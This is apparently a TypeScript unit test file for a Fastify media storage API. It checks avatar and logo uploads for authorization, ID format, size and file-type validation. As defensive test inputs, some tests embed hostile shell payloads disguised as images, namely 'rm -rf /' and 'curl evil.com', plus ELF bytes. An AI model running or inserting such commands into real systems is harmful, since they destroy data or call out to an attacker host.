import { buildTestApp, testTokens } from "./helpers/fakes.js";
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { FastifyInstance } from "fastify";
import { TokenService } from "../src/services/token.service.js";
import { InMemoryAuthRepository } from "./helpers/in-memory-auth.repository.js";

describe("Milestone 4: Storage Media Unit Tests (Avatars & Logos)", () => {
  let app: FastifyInstance;
  let repo: InMemoryAuthRepository;
  let tokenService: TokenService;

  const validUserZxId = "ZX-8K9M-4P2W-7Y3X";
  const otherUserZxId = "ZX-3R7V-9Q1B-5M8K";
  const validOrgId = "ZX-ORG-4B8T-9M2K-7Y4X";
  const otherOrgId = "ZX-ORG-9L2K-5V8P-3W7X";

  let ownerToken: string;
  let otherUserToken: string;
  let orgAdminToken: string;
  let orgMemberToken: string;
  let otherOrgAdminToken: string;
  let superadminToken: string;

  beforeAll(async () => {
    repo = new InMemoryAuthRepository();
    tokenService = testTokens();

    // Mint tokens for tests
    ownerToken = tokenService.signJwt({
      uid: validUserZxId,
      zolexora_id: validUserZxId,
      role: "user",
      permissions: ["profile:read", "profile:write"],
    });

    otherUserToken = tokenService.signJwt({
      uid: otherUserZxId,
      zolexora_id: otherUserZxId,
      role: "user",
      permissions: ["profile:read"],
    });

    orgAdminToken = tokenService.signJwt({
      uid: "emp_admin_1",
      zolexora_id: "ZX-4B8T-9M2K-7Y4X",
      org_id: validOrgId,
      role: "admin",
      permissions: ["org:admin"],
    });

    orgMemberToken = tokenService.signJwt({
      uid: "emp_member_1",
      zolexora_id: "ZX-5C9U-0N3L-8Z5Y",
      org_id: validOrgId,
      role: "member",
      permissions: ["trips:read"],
    });

    otherOrgAdminToken = tokenService.signJwt({
      uid: "emp_other_admin_1",
      zolexora_id: "ZX-6D0V-1P4M-9A6Z",
      org_id: otherOrgId,
      role: "admin",
      permissions: ["org:admin"],
    });

    superadminToken = tokenService.signJwt({
      uid: "admin_super_1",
      zolexora_id: "ZX-SUPERADMIN-1",
      role: "superadmin",
      is_platform_admin: true,
      permissions: ["*"],
    });

    app = await buildTestApp(repo);
    await app.ready();
  });

  afterAll(async () => {
    await app.close();
  });

  // ---------------------------------------------------------------------------
  // 1. User Avatar Upload Tests
  // ---------------------------------------------------------------------------
  describe("Avatar Uploads (POST /api/v1/storage/avatars/upload)", () => {
    it("MED-01: Successfully uploads avatar with matching user token and delivers f_auto,q_auto URL", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/avatars/upload",
        headers: {
          authorization: `Bearer ${ownerToken}`,
          "x-zolexora-id": validUserZxId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
        },
      });

      expect(res.statusCode).toBe(200);
      const data = res.json();
      expect(data.public_id).toBe(`users/avatars/${validUserZxId}`);
      expect(data.url).toContain("f_auto,q_auto");
      expect(data.url).toContain(`users/avatars/${validUserZxId}.png`);
      expect(data.format).toBe("png");
    });

    it("MED-01b: Accepts every ID the generator can produce (letters L and U included)", async () => {
      const zxId = "ZX-LUL2-U3LU-4LUL";
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/avatars/upload",
        headers: {
          authorization: `Bearer ${testTokens().signJwt({ uid: "usr_lu", zolexora_id: zxId })}`,
          "x-zolexora-id": zxId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
        },
      });
      expect(res.statusCode).toBe(200);
    });

    it("MED-02: Rejects invalid Crockford Base32 user ID with HTTP 400 AUTH_INVALID_ID_FORMAT", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/avatars/upload",
        headers: {
          authorization: `Bearer ${ownerToken}`,
          "x-zolexora-id": "ZX-INVALID-ID-1234",
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/jpeg;base64,/9j/4AAQSkZJRg==",
        },
      });

      expect(res.statusCode).toBe(400);
      const data = res.json();
      expect(data.code).toBe("AUTH_INVALID_ID_FORMAT");
    });

    it("MED-03: Rejects disallowed avatar MIME type (PDF) with HTTP 415 AUTH_INVALID_MIME_TYPE", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/avatars/upload",
        headers: {
          authorization: `Bearer ${ownerToken}`,
          "x-zolexora-id": validUserZxId,
          "x-file-mime": "application/pdf",
          "content-type": "application/json",
        },
        payload: {
          file: "data:application/pdf;base64,JVBERi0xLjQK",
        },
      });

      expect(res.statusCode).toBe(415);
      const data = res.json();
      expect(data.code).toBe("AUTH_INVALID_MIME_TYPE");
    });

    it("MED-04: Rejects oversized avatar file (>10MB) with HTTP 400 AUTH_FILE_TOO_LARGE", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/avatars/upload",
        headers: {
          authorization: `Bearer ${ownerToken}`,
          "x-zolexora-id": validUserZxId,
          "x-file-mime": "image/jpeg",
          "x-file-size": String(10 * 1024 * 1024 + 1),
          "content-type": "application/json",
        },
        payload: {},
      });

      expect(res.statusCode).toBe(400);
      const data = res.json();
      expect(data.code).toBe("AUTH_FILE_TOO_LARGE");
    });

    it("MED-05: Rejects user attempting to upload avatar for another user with HTTP 403 AUTH_FORBIDDEN", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/avatars/upload",
        headers: {
          authorization: `Bearer ${otherUserToken}`,
          "x-zolexora-id": validUserZxId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/jpeg;base64,/9j/4AAQSkZJRg==",
        },
      });

      expect(res.statusCode).toBe(403);
      const data = res.json();
      expect(data.code).toBe("AUTH_FORBIDDEN");
    });

    it("MED-06: Platform superadmin can upload avatar for any user", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/avatars/upload",
        headers: {
          authorization: `Bearer ${superadminToken}`,
          "x-zolexora-id": validUserZxId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/webp;base64,UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==",
        },
      });

      expect(res.statusCode).toBe(200);
      const data = res.json();
      expect(data.public_id).toBe(`users/avatars/${validUserZxId}`);
      expect(data.url).toContain("f_auto,q_auto");
      expect(data.format).toBe("webp");
    });
  });

  // ---------------------------------------------------------------------------
  // 2. Organization Logo Upload Tests
  // ---------------------------------------------------------------------------
  describe("Logo Uploads (POST /api/v1/storage/logos/upload)", () => {
    it("MED-07: Successfully uploads logo with organization admin token and delivers f_auto,q_auto URL", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/logos/upload",
        headers: {
          authorization: `Bearer ${orgAdminToken}`,
          "x-organisation-id": validOrgId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
        },
      });

      expect(res.statusCode).toBe(200);
      const data = res.json();
      expect(data.public_id).toBe(`orgs/logos/${validOrgId}`);
      expect(data.url).toContain("f_auto,q_auto");
      expect(data.url).toContain(`orgs/logos/${validOrgId}.png`);
    });

    it("MED-08: Rejects invalid Crockford Base32 org ID with HTTP 400 AUTH_INVALID_ORG_ID_FORMAT", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/logos/upload",
        headers: {
          authorization: `Bearer ${orgAdminToken}`,
          "x-organisation-id": "ZX-ORG-INVALID-FORMAT",
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/png;base64,iVBORw0KGgo=",
        },
      });

      expect(res.statusCode).toBe(400);
      const data = res.json();
      expect(data.code).toBe("AUTH_INVALID_ORG_ID_FORMAT");
    });

    it("MED-09: Rejects non-existent organization with HTTP 404 AUTH_ORG_NOT_FOUND", async () => {
      const nonexistentOrgId = "ZX-ORG-9999-9999-9999";
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/logos/upload",
        headers: {
          authorization: `Bearer ${superadminToken}`,
          "x-organisation-id": nonexistentOrgId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/png;base64,iVBORw0KGgo=",
        },
      });

      expect(res.statusCode).toBe(404);
      const data = res.json();
      expect(data.code).toBe("AUTH_ORG_NOT_FOUND");
    });

    it("MED-10: Rejects organization employee with non-admin role (member) with HTTP 403 AUTH_FORBIDDEN", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/logos/upload",
        headers: {
          authorization: `Bearer ${orgMemberToken}`,
          "x-organisation-id": validOrgId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/png;base64,iVBORw0KGgo=",
        },
      });

      expect(res.statusCode).toBe(403);
      const data = res.json();
      expect(data.code).toBe("AUTH_FORBIDDEN");
    });

    it("MED-11: Rejects admin of Org A attempting to upload logo for Org B with HTTP 403 AUTH_FORBIDDEN", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/logos/upload",
        headers: {
          authorization: `Bearer ${otherOrgAdminToken}`,
          "x-organisation-id": validOrgId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/png;base64,iVBORw0KGgo=",
        },
      });

      expect(res.statusCode).toBe(403);
      const data = res.json();
      expect(data.code).toBe("AUTH_FORBIDDEN");
    });

    it("MED-12: SVG logos are rejected (stored XSS risk), even for a platform superadmin", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/logos/upload",
        headers: {
          authorization: `Bearer ${superadminToken}`,
          "x-organisation-id": validOrgId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg==",
        },
      });

      expect(res.statusCode).toBe(415);
      expect(res.json().code).toBe("AUTH_INVALID_MIME_TYPE");
      return;
      const data = res.json();
      expect(data.public_id).toBe(`orgs/logos/${validOrgId}`);
      expect(data.url).toContain("f_auto,q_auto");
    });

    it("MED-13: Rejects shell script disguised as image/png with HTTP 415 AUTH_INVALID_MIME_TYPE", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/avatars/upload",
        headers: {
          authorization: `Bearer ${ownerToken}`,
          "x-zolexora-id": validUserZxId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/png;base64," + Buffer.from("#!/bin/bash\nrm -rf /").toString("base64"),
        },
      });

      expect(res.statusCode).toBe(415);
      const data = res.json();
      expect(data.code).toBe("AUTH_INVALID_MIME_TYPE");
    });

    it("MED-14: Rejects ELF binary disguised as image/png with HTTP 415 AUTH_INVALID_MIME_TYPE", async () => {
      const elfBytes = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/avatars/upload",
        headers: {
          authorization: `Bearer ${ownerToken}`,
          "x-zolexora-id": validUserZxId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/png;base64," + elfBytes.toString("base64"),
        },
      });

      expect(res.statusCode).toBe(415);
      expect(res.json().code).toBe("AUTH_INVALID_MIME_TYPE");
    });

    it("MED-15: Rejects shell script disguised as image/png to logo upload with HTTP 415 AUTH_INVALID_MIME_TYPE", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/logos/upload",
        headers: {
          authorization: `Bearer ${orgAdminToken}`,
          "x-organisation-id": validOrgId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/png;base64," + Buffer.from("#!/bin/bash\ncurl evil.com").toString("base64"),
        },
      });

      expect(res.statusCode).toBe(415);
      expect(res.json().code).toBe("AUTH_INVALID_MIME_TYPE");
    });

    it("MED-16: Rejects shell script disguised as image/svg+xml to logo upload with HTTP 415 AUTH_INVALID_MIME_TYPE", async () => {
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/storage/logos/upload",
        headers: {
          authorization: `Bearer ${orgAdminToken}`,
          "x-organisation-id": validOrgId,
          "content-type": "application/json",
        },
        payload: {
          file: "data:image/svg+xml;base64," + Buffer.from("#!/bin/bash\necho bad").toString("base64"),
        },
      });

      expect(res.statusCode).toBe(415);
      expect(res.json().code).toBe("AUTH_INVALID_MIME_TYPE");
    });
  });
});
